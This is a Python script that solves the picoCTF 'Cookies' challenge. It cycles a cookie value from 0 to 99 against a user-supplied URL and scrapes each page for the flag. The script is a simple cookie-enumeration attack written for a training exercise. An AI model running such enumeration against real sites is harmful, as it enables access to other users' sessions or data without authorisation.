#!/bin/python
#!/bin/python
"""
This script is a tool for solving the picoCTF Cookies Challenge. It sends HTTP requests to a target URL with different cookie values and searches for the flag in the response.

Usage:
1. Run the script.
2. Enter the target URL when prompted.
3. The script will try 100 different cookie values (0 to 99) and print the response for each attempt.
4. If the flag is found in the response, it will be printed in green color, and the script will exit.

The script uses the following libraries:
- signal: for handling keyboard interrupts (Ctrl+C)
- sys: for exiting the script
- requests: for sending HTTP requests
- BeautifulSoup: for parsing HTML responses

The script defines the following functions:
- check_flag(value): Checks if the given value contains the string 'picoCTF'. If so, it prints the cookie value and the flag in green color, and returns True.
- signal_handler(sig, frame): Handles the keyboard interrupt signal (Ctrl+C) by printing a message in red color and exiting the script.

The script also defines some ANSI escape codes for colored output:
- RED: for red color
- RESET: for resetting the color to default
- YELLOW: for yellow color
- GREEN: for green color

The script starts by printing a banner and the target URL prompt in yellow color. Then, it enters a loop that iterates from 0 to 99.

In each iteration, the script:
1. Creates a cookie dictionary with the current iteration value as the 'name' key.
2. Sends an HTTP GET request to the target URL with the cookie.
3. If the response status code is 200 (OK):
   a. Parses the HTML response using BeautifulSoup.
   b. Finds the element with the class 'jumbotron' and extracts its text.
   c. Calls the check_flag function with the extracted text.
   d. If the check_flag function returns True, the script exits.
   e. Prints the cookie value and the extracted text in yellow color.
4. If the response status code is not 200, the script continues to the next iteration.

Note: This script is intended for educational purposes only and should not be used for any malicious activities.
"""

import signal
import sys
import requests
from bs4 import BeautifulSoup

RED = '\033[91m'
RESET = '\033[0m'
YELLOW = '\033[93m'
GREEN = '\033[92m'

print(r"""
  /$$$$$$                      /$$       /$$                    
 /$$__  $$                    | $$      |__/                    
| $$  \__/  /$$$$$$   /$$$$$$ | $$   /$$ /$$  /$$$$$$   /$$$$$$$
| $$       /$$__  $$ /$$__  $$| $$  /$$/| $$ /$$__  $$ /$$_____/
| $$      | $$  \ $$| $$  \ $$| $$$$$$/ | $$| $$$$$$$$|  $$$$$$ 
| $$    $$| $$  | $$| $$  | $$| $$_  $$ | $$| $$_____/ \____  $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$ /$$$$$$$/
 \______/  \______/  \______/ |__/  \__/|__/ \_______/|_______/
""")
print(f"picoCTF Cookies Challenge Tool{GREEN}\nhttps://github.com/SamVivan1/picoCTF_Cookies{RESET}\n")

url = input(f"{RED}Target URL:{RESET} {YELLOW}")
print(f"{RED}Searching for flag...{RESET}\n")

def check_flag(value):
    if 'picoCTF' in value:
        print(f'Cookie: {GREEN}{nilai}{RESET}, {GREEN}{value}{RESET}')
        return True

def signal_handler(sig, frame):
    print(f'\n{RED}Terminating program...{RESET}')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

for i in range(100):
    nilai = str(i)
    cookie = {'name': nilai}
    try:
        response = requests.get(url, cookies=cookie)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            value = soup.find(class_='jumbotron')
            hasil = value.text.strip()
            if check_flag(hasil):
                sys.exit(0)
            print(f"{RESET}Cookie: {YELLOW}{nilai}{RESET}, Value: {YELLOW}{hasil}{RESET}")
        else:
            print(f'Ada error: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Ada error: {e}')

print('Tidak dapat menemukan flag setelah 100 percobaan.')
